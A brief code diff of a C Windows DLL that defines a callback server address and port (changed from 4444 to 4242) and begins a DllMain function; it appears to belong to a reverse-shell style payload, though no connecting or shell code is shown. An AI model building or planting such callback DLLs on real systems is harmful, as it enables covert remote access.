@@ -3,7 +3,7 @@
 #include <winsock2.h>
 
 #define SERVER_IP "192.168.45.209"
-#define SERVER_PORT 4444
+#define SERVER_PORT 4242
 
 BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
 {
